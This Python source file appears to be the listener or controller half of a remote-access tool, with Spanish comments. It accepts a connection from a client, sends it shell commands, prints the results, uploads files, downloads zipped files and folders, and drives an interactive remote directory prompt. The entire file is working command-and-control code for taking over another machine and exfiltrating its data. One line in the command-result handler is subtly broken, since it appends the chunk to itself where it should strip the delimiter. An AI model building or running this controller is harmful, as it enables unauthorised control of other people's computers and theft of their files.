import socket

CHUNK_SIZE = 4*1024
DELIMETER = "<END_OF_RESULTS>"

class ServerConnection:
    def __init__(self):
        #CREATES A TCP socket for server in IPv4 
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#CONEXION
    def CreateConnection(self, ip="", port=8080):
        
        self.server_ip = ip
        self.server_port = port
        self.address = (self.server_ip, self.server_port)
        #Enlaza la conexion
        self.socket.bind(self.address)

        
    def Listen(self, backlog = 5):
        self.socket.listen(backlog)

    def AcceptConnection(self):
       self.client_conn, self.client_address = self.socket.accept()
       print ("\t\t[+] Connection established with "+ self.client_address[0] + " on port " + str(self.client_address[1]))
       return(self.client_conn, self.client_address)

    def send_data(self, user_input):
        user_input_bytes = bytes(user_input, "utf-8")

        self.client_conn.send(user_input_bytes)
 
    def receive_data(self):
        received_data_bytes = self.client_conn.recv(CHUNK_SIZE)
        self.data = received_data_bytes.decode('utf-8') #Convertir los bytes
        return (self.data)


    def receive_command_result(self):
        print ("[+] Getting Command Results")

        result = b''

        while True:
            chunk = self.client_conn.recv(CHUNK_SIZE)

            if chunk.endswith(DELIMETER.encode()):
                chunk += chunk[:-len(DELIMETER)] # Separar el resultado y el delimeter

                result += chunk
                break

            result += chunk

        print(result.decode())

    def send_file(self, filename):
        print("[+] Sending file ")
        with open(filename, "rb") as file:
            chunk = file.read(CHUNK_SIZE) 

            while len(chunk) > 0: #Revisar que el archivo no este vacio
                self.client_conn.send(chunk)

                chunk = file.read(CHUNK_SIZE)

            self.client_conn.send(DELIMETER.encode()) #Enviar delimeter con el archivo
    
    def receive_zipped(self, zipped_file):
        print("[+] Receiving zipped file/folder]")

        full_file = b''
        while True:
            chunk = self.client_conn.recv(CHUNK_SIZE)
            if chunk.endswith(DELIMETER.encode()):
                chunk = chunk[:-len(DELIMETER)]

                full_file += chunk
                break
            full_file += chunk

        with open (zipped_file, "wb") as file:
            file.write(full_file)
        print("[+] File/Folder Downloaded successfully")

    def change_dir(self):
        print("[+] Changing directory")

        pwd = self.receive_data()

        while True:
            print(f'{pwd} >>', end=" ")
            user_command = input("")
            self.send_data(user_command)
            if user_command == "stop":
                break
            pwd = self.receive_data()


    def close(self):
        self.socket.close()
        

